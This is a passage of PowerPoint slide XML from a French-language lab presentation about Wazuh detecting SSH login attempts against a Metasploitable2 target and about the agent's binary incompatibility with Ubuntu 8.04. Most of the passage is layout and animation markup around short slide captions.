              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7635240" y="2606040"/>
            <a:ext cx="365760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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Script expect personnalisé pilotant le client ssh natif</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="284" name="Google Shape;284;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6887195" y="2935224"/>
            <a:ext cx="4147849" cy="3227832"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1983"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E5E"/>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85" name="Google Shape;285;p15" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig40_expect_script_success.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6969491" y="3017520"/>
            <a:ext cx="3983257" cy="3063240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="286" name="Google Shape;286;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6887195" y="6199632"/>
            <a:ext cx="4147849"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Wazuh confirme en temps réel les tentatives du script (règle 2501)</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;p15"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>15</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0CD4EA3E-F22F-7923-3D10-B4B1341DE224}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9029319" y="1417319"/>
            <a:ext cx="1267076" cy="834771"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF89CE9C-EFC4-9AE7-AC1F-A99D0ECEE444}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="146555" y="1266508"/>
            <a:ext cx="1636525" cy="1321244"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6D9D3F4-16E4-52C8-069E-A378F505E704}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="1268730"/>
            <a:ext cx="1901380" cy="1184148"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Image 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB93FB97-AE53-F8B1-39D7-DC194DB225D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5287977" y="1222957"/>
            <a:ext cx="3108102" cy="1223063"/>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5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="265"/>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8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26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0"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="16" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="270"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="17" presetID="10"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4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="274"/>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64"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26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79"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="279"/>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277"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="41" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="277"/>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280"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="280"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="45" presetID="22" presetClass="entr" presetSubtype="4" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="46" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="285"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="285"/>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84"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="50" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="284"/>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86"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="53" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="286"/>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283"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="283"/>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276"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="59" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="276"/>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282"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="62" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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 grpId="0" animBg="1"/>
      <p:bldP spid="265" grpId="0"/>
      <p:bldP spid="268" grpId="0"/>
      <p:bldP spid="270" grpId="0" animBg="1"/>
      <p:bldP spid="274" grpId="0"/>
      <p:bldP spid="276" grpId="0"/>
      <p:bldP spid="277" grpId="0"/>
      <p:bldP spid="280" grpId="0"/>
      <p:bldP spid="282" grpId="0"/>
      <p:bldP spid="283" grpId="0"/>
      <p:bldP spid="284" grpId="0" animBg="1"/>
      <p:bldP spid="286"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2"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="293" name="Google Shape;293;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="D97706"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>· EXTENSION — RÉPONSE AUTOMATIQUE</a:t>
            </a:r>
            <a:endParaRPr b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0E9E5E"/>
              </a:solidFill>
              <a:latin typeface="Cambria"/>
              <a:ea typeface="Cambria"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="294" name="Google Shape;294;p16"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>défi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> central : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>déployer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> un agent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>natif</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="295" name="Google Shape;295;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="1600200" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="16002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DÉFI MAJEUR</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2286000" y="1371600"/>
            <a:ext cx="420624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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>symbol lookup error … GLIBCXX_3.4</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466344" y="1765151"/>
            <a:ext cx="5559552" cy="2047539"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3126"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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99" name="Google Shape;299;p16" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig113_glibcxx_error.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1847447"/>
            <a:ext cx="5394960" cy="1882947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="Google Shape;300;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466344" y="3849265"/>
            <a:ext cx="5559552"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a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Incompatibilité binaire (ABI) : agent moderne vs Ubuntu 8.04 (2008)</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3931920"/>
            <a:ext cx="5394960" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="136000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Metasploitable2, volontairement figé depuis 2008 pour rester une cible pédagogique, est structurellement incompatible avec un agent Wazuh moderne. Constat définitif, non contournable par configuration.</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1371600"/>
            <a:ext cx="1280160" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1371600"/>
            <a:ext cx="128016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SOLUTION</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7635240" y="1371600"/>
            <a:ext cx="402336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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Réorientation vers la chaîne Syslog + Active Response déjà en place</a:t>
            </a:r>
